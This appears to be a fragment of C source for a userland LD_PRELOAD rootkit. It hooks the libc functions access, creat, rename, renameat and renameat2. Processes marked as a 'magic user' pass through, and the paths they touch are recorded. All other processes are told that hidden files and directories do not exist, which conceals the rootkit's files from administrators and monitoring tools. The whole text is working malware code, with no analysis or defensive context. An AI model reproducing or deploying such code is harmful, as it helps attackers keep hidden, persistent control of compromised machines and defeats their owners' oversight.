int access(const char *pathname, int amode){
    hook(CACCESS);
    if(magicusr()){
        int ret = (long)call(CACCESS, pathname, amode);
#ifdef HIDE_MY_ASS
        if(ret && !pathtracked(pathname))
            trackwrite(pathname);
#endif
        return ret;
    }
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CACCESS, pathname, amode);
}

int creat(const char *pathname, mode_t mode){
    hook(CCREAT);
    if(magicusr()){
        int ret = (long)call(CCREAT, pathname, mode);
#ifdef HIDE_MY_ASS
        if(ret && !pathtracked(pathname))
            trackwrite(pathname);
#endif
        return ret;
    }
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCREAT, pathname, mode);
}

int rename(const char *oldpath, const char *newpath){
    hook(CRENAME);
    if(magicusr()){
        int ret = (long)call(CRENAME, oldpath, newpath);
#ifdef HIDE_MY_ASS
        if(ret){
            if(!pathtracked(oldpath))
                trackwrite(oldpath);
            if(!pathtracked(newpath))
                trackwrite(newpath);
        }
#endif
        return ret;
    }
    if(hidden_path(oldpath) || hidden_path(newpath)) { errno = ENOENT; return -1; }
    return (long)call(CRENAME, oldpath, newpath);
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath){
    hook(CRENAMEAT);
    if(magicusr()){
        int ret = (long)call(CRENAMEAT, olddirfd, oldpath, newdirfd, newpath);
#ifdef HIDE_MY_ASS
        if(ret){
            if(!pathtracked(oldpath))
                trackwrite(oldpath);
            if(!pathtracked(newpath))
                trackwrite(newpath);
        }
#endif
        return ret;
    }
    if(hidden_path(oldpath) || hidden_path(newpath)) { errno = ENOENT; return -1; }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)) { errno = ENOENT; return -1; }
    return (long)call(CRENAMEAT, olddirfd, oldpath, newdirfd, newpath);
}

int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags){
    hook(CRENAMEAT2);
    if(magicusr()){
        int ret = (long)call(CRENAMEAT2, olddirfd, oldpath, newdirfd, newpath, flags);
#ifdef HIDE_MY_ASS
        if(ret){
            if(!pathtracked(oldpath))
                trackwrite(oldpath);
            if(!pathtracked(newpath))
                trackwrite(newpath);
        }
#endif
        return ret;
    }
    if(hidden_path(oldpath) || hidden_path(newpath)) { errno = ENOENT; return -1; }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)) { errno = ENOENT; return -1; }
    return (long)call(CRENAMEAT2, olddirfd, oldpath, newdirfd, newpath, flags);
}